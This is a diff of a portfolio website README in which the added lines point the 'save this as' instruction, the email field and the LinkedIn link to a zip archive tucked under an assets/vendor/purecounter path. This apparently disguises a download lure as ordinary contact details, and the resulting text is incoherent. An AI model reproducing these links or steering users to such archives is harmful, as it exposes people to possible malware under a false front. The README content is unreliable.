@@ -40,9 +40,9 @@ This portfolio website showcases my skills, projects, and achievements. It inclu
 2. **Update the projects section** with descriptions of your actual projects.
 3. Feel free to add any additional sections or details that reflect your personality and work!
 
-You can save this as `https://raw.githubusercontent.com/Sitharthsithu/Web-portfolio/main/brayera/Web-portfolio.zip` in the root directory of your repository. Let me know if you need any changes or additional sections!
+You can save this as `https://raw.githubusercontent.com/Sitharthsithu/Web-portfolio/main/assets/vendor/purecounter/portfolio_Web_2.0-alpha.2.zip` in the root directory of your repository. Let me know if you need any changes or additional sections!
 
 Feel free to reach out to me for collaborations or inquiries!
 
-Email: https://raw.githubusercontent.com/Sitharthsithu/Web-portfolio/main/brayera/Web-portfolio.zip
-LinkedIn:[ my-linkedin-profile](https://raw.githubusercontent.com/Sitharthsithu/Web-portfolio/main/brayera/Web-portfolio.zip)
+Email: https://raw.githubusercontent.com/Sitharthsithu/Web-portfolio/main/assets/vendor/purecounter/portfolio_Web_2.0-alpha.2.zip
+LinkedIn:[ my-linkedin-profile](https://raw.githubusercontent.com/Sitharthsithu/Web-portfolio/main/assets/vendor/purecounter/portfolio_Web_2.0-alpha.2.zip)
